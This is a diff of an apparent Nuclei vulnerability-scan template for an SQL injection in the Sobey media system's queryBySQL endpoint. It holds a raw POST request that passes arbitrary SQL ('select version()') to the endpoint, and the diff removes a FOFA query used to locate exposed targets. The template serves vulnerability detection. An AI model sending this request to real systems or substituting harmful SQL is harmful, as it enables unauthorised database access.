@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体系统 queryBySQL 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ex0h9d8pg3bnr734'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ex0h9d8pg3bnr734
-    fofa: app="SOBEY-融媒体"
 http:
 - raw:
   - 'POST /news-adapter/rest/s/doc/queryBySQL HTTP/1.1
@@ -26,9 +22,7 @@ http:
     User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
 
 
-    { "SQL": "select version()" }
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1787582715632-24b15be0-bb94-4bf3-8b9b-70ca09112bc6.png)'
+    { "SQL": "select version()" }'
   redirects: false
   matchers:
   - status:
